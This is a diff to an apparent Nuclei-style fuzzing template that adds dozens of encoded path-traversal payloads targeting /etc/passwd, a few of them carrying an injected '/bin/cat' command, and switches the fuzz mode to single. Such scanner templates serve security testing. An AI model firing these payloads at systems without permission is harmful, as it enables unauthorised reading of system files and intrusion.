@@ -19,7 +19,6 @@ http:
 
     payloads:
       nix_fuzz:
-        low:
           - '/etc/passwd'
           - '../../etc/passwd'
           - '../../../etc/passwd'
@@ -29,7 +28,6 @@ http:
           - '../../../../../../../etc/passwd'
           - '../../../../../../etc/passwd'
           - '../../../../../etc/passwd'
-        medium:
           - '../../../../etc/passwd'
           - '../../../etc/passwd'
           - '../../../etc/passwd%00'
@@ -44,13 +42,37 @@ http:
           - '.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd'
           - '\..\..\..\..\..\..\..\..\..\..\etc\passwd%00'
           - '..\..\..\..\..\..\..\..\..\..\etc\passwd%00'
+          - '%2fetc%2fpasswd'
+          - '..%2f..%2fetc%2fpasswd'
+          - '..%2f..%2f..%2fetc%2fpasswd'
+          - '%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+          - '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+          - '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+          - '..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+          - '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+          - '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+          - '..%2f..%2f..%2f..%2fetc%2fpasswd'
+          - '..%2f..%2f..%2fetc%2fpasswd'
+          - '..%2f..%2f..%2fetc%2fpasswd%00'
+          - '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00'
+          - '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+          - '%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd^^'
+          - '%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+          - '%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2fetc%2fpasswd'
+          - '%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd'
+          - '..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd'
+          - '%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2fetc%2fpasswd'
+          - '.%5c%5c.%2f.%5c%5c.%2f.%5c%5c.%2f.%5c%5c.%2f.%5c%5c.%2f.%5c%5c.%2fetc%2fpasswd'
+          - '%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd%00'
+          - '..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd%00'
           - '%252e%252e%252fetc%252fpasswd'
-        high:
           - '%252e%252e%252fetc%252fpasswd%00'
           - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
           - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00'
           - '....//....//etc/passwd'
           - '..///////..////..//////etc/passwd'
+          - '....%2f%2f....%2f%2fetc%2fpasswd'
+          - '..%2f%2f%2f%2f%2f%2f%2f..%2f%2f%2f%2f..%2f%2f%2f%2f%2f%2fetc%2fpasswd'
           - '/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd'
           - '%0a/bin/cat%20/etc/passwd'
           - '%00/etc/passwd%00'
@@ -59,6 +81,10 @@ http:
           - '/../../../../../../../../../../../etc/passwd%00.html'
           - '/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd'
           - '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+          - '%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00.jpg'
+          - '%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00.html'
+          - '%2f..%c0%af..%2f..%c0%af..%2f..%c0%af..%2f..%c0%af..%2f..%c0%af..%2f..%c0%af..%2fetc%2fpasswd'
+          - '%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
           - '\\&apos;/bin/cat%20/etc/passwd\\&apos;'
           - '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
           - '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
@@ -68,11 +94,24 @@ http:
           - '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
           - '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
           - '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+          - '///../../../../../etc/passwd'
+          - '//////../../../../../../etc/passwd'
+          - '%5c%5c&apos;%2fbin%2fcat%20%2fetc%2fpasswd%5c%5c&apos;'
+          - '%2fcgi-bin%2f.%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+          - '%2fcgi-bin%2f.%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+          - '%2fcgi-bin%2f.%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+          - '%2fcgi-bin%2f.%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+          - '%2fcgi-bin%2f.%%32%65%2f.%%32%65%2f.%%32%65%2f.%%32%65%2fetc%2fpasswd'
+          - '%2fcgi-bin%2f.%%32%65%2f.%%32%65%2f.%%32%65%2f.%%32%65%2f.%%32%65%2fetc%2fpasswd'
+          - '%2fcgi-bin%2f.%%32%65%2f.%%32%65%2f.%%32%65%2f.%%32%65%2f.%%32%65%2f.%%32%65%2fetc%2fpasswd'
+          - '%2fcgi-bin%2f.%%32%65%2f.%%32%65%2f.%%32%65%2f.%%32%65%2f.%%32%65%2f.%%32%65%2f.%%32%65%2fetc%2fpasswd'
+          - '%2f%2f%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+          - '%2f%2f%2f%2f%2f%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
 
     fuzzing:
       - part: query
         type: replace # replaces existing parameter value with fuzz payload
-        mode: multiple # replaces all parameters value with fuzz payload
+        mode: single # replaces all parameters value with fuzz payload
         fuzz:
           - '{{nix_fuzz}}'
 
